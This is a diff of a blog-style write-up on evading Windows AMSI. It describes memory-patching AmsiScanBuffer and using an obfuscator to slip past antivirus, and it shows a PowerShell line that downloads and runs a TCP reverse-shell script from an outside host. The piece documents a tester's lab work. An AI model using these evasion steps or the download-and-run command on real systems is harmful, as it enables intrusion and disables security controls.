@@ -6,7 +6,7 @@
 - [ **Credits & Reference**](#section-4)
 
 
-## Outline
+## Outline  {#section-0}
 
 The goal of this write-up is to evade the most up to date AMSI protection measure implemented in Windows 10 Pro (2023/07/28) using AMSI memory patching technique. The objective was to gain a Remote Code Execution (RCE) as NT/Authority System.
 
@@ -15,7 +15,7 @@ The goal of this write-up is to evade the most up to date AMSI protection measur
 AMSI (Antimalware Scan Interface) is a Windows feature introduced in Windows 10 and Windows Server 2016. Its primary purpose is to provide an interface that allows antivirus and other security solutions to scan and inspect scripts and code in real-time at runtime.
 
 By default, windows defender interacts with the AMSI API to scan PowerShell scripts, VBA macros, JavaScript and scripts using the Windows Script Host technology during execution. When a user executes a script or initiates PowerShell, the AMSI.dll is injected into the process memory space.  `AmsiScanBuffer()`and `AmsiScanString()` are used by the antivirus before execution to scan the buffer and strings for suspicious activities. This ultimately prevents arbitrary execution of code.
-# AMSI Evasion
+# AMSI Evasion {#section-1}
 The following evasive techniques aim to avoid detection by antivirus and security software.  
 
 ##### Code Fragmentation: 
@@ -29,7 +29,7 @@ Obfuscation techniques are utilized to deliberately obscure the actual intent an
 Memory patching modifies the AMSI Dynamic Link Library (DLL) in memory during runtime. This technique allows threat actors to temporarily disable or alter the functionality of AMSI. This allows attackers to run malicious scripts in memory without hindrance and triggering alerts. 
 #### PowerShell Downgrade: 
 PowerShell downgrading is switching the current PowerShell to Windows PowerShell verison 2.0. This version does not have AMSI protection, which makes it susceptible to arbitrary code execution. By using an older version of PowerShell, attackers can bypass the built-in security measures present in newer versions and execute malicious scripts undetected.
-## Proof of Concept
+## Proof of Concept {#section-2}
 
 ![](/assets/AV/Final.gif)  
 
@@ -38,7 +38,7 @@ To verify that AMSI is correctly functioning, the tester first tried to initiate
 IEX (New-Object Net.WebClient).DownloadString('http://192.168.20.128:8443/Invoke-PowerShellTcp.ps1')
 ```
 However, as seen above, AMSI successfully flags the activity as  `malicious` and proceeds to block the reverse shell connection. 
-## Memory Patching
+## Memory Patching  {#section-3}
 In order to bypass AMSI, the tester utilized the following payload which was referenced from [Red Team Playbook](https://www.xn--hy1b43d247a.com/defense-evasion/amsi-bypass)
 ```bash
 $thing = @"
@@ -82,7 +82,7 @@ $p = 0
 
 By applying a patch to the `AmsiScanBuffer` function in `AMSI.dll`, using specific assembly code (mov eax, 0x80070057 and ret), the function promptly returns an error code, effectively avoiding the scanning of PowerShell code. This method allows the attacker's PowerShell code to execute without triggering AMSI's detection.
 
-However, it is essential to acknowledge that the above memory patching payload might be flagged by ASMI before one could patch the ASMIScanBuffer.dll itself. Thus it is necessary to implement proper obfuscation methodologies before one delivers the payload. To conceal the payload's content and intention, the tester opted to utilize Chameleon PowerShell Obfuscator. Chameleon is a specialized tool designed to obfuscate PowerShell scripts and circumvent AMSI and commercial antivirus solutions. It employs a range of obfuscation techniques to evade common detection signatures, thereby enhancing its effectiveness in avoiding detection. Examples of obfuscation methods include but are not limited to comment deletion/substitution
+However, it is essential to acknowledge that the above memory patching payload might be flagged by ASMI before one could patch the `ASMIScanBuffer.dll` itself. Thus it is necessary to implement proper obfuscation methodologies before one delivers the payload. To conceal the payload's content and intention, the tester opted to utilize Chameleon PowerShell Obfuscator. Chameleon is a specialized tool designed to obfuscate PowerShell scripts and circumvent AMSI and commercial antivirus solutions. It employs a range of obfuscation techniques to evade common detection signatures, thereby enhancing its effectiveness in avoiding detection. Examples of obfuscation methods include but are not limited to comment deletion/substitution
 string substitution (variables, functions, data-types) ,variable concatenation ,indentation randomization ,semi-random backticks insertion and randomization.
 
 The below code snippet contains a payload that has undergone multiple layers of obfuscation.
@@ -118,5 +118,5 @@ IEX (New-Object Net.WebClient).DownloadString('http://192.168.20.128:8443/Invoke
 Consequently, the tester achieved a  Remote Code Execution (RCE) with NT/Authority System privileges.
 ![](/assets/AV/system.png)  
 
-## Reference
+## Reference  {#section-4}
 [Red Team Playbook](https://www.xn--hy1b43d247a.com/defense-evasion/amsi-bypass) && [Pentest Laboratories](https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/)
